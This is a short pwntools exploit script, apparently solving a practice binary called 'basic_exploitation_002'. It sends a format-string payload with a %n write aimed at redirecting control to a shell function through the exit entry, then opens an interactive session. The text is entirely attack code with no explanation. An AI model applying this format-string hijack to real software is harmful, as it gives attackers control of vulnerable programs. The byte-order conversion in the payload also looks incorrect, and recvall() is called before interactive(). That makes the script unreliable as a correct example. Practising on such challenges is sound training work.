from pwn import *

port = 0
# rem = remote("", port)
rem = process("./basic_exploitation_002/problem/basic_exploitation_002")

exit_plt = 0x8048470
shell_addr = 0x8048609
payload = f'%{int.from_bytes(p32(shell_addr), "big")}c%3$n'.ljust(16)
payload = payload.encode()
payload += p32(exit_plt)

rem.sendline(payload)
rem.recvall()

rem.interactive()